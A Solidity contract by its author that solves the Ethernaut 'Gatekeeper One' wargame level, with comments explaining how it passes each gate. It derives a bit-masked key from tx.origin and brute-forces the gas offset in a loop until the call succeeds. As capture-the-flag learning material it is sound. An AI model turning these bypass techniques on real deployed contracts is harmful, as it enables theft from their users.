// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 *  @title ATTACK GATEKEEPER ONE
 *  @author crys
 *  @notice This will be my solution for the Ethernaut Game
 *  @dev There will be mini notes below to serve as guide.
 * In order to pass the player should have a basic understanding
 * of difference of msg.sender vs tx.origin,opcodes, data types
 * and conversion in solidity, bit-masking, and gasLeft().
 **/

contract AttackGateKeeperOne {
    event Entered(bool succeeded, uint256 gasUsed);

    // contract will be used to meet modifier 1 requirement
    function enterGate(
        address _gateAddress,
        uint256 _gasLowerLimit,
        uint256 _gasUpperLimit
    ) public returns (bool) {
        // bit-masking to meet requirements of modifier 3
        bytes8 key = bytes8(uint64(tx.origin)) & 0xffffffff0000ffff;

        bool success;
        bool succeeded = false;
        uint256 gasUsed = 0;

        // brute force gas estimate here by using for loop
        // let i be the gas estimate to meet requirement of modifier 2
        for (uint256 i = _gasLowerLimit; i < _gasUpperLimit; i++) {
            (success, ) = address(_gateAddress).call{gas: (i + (8191 * 3))}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                gasUsed = i;
                succeeded = success;
                break;
            }
        }

        emit Entered(succeeded, gasUsed);

        return succeeded;
    }
}
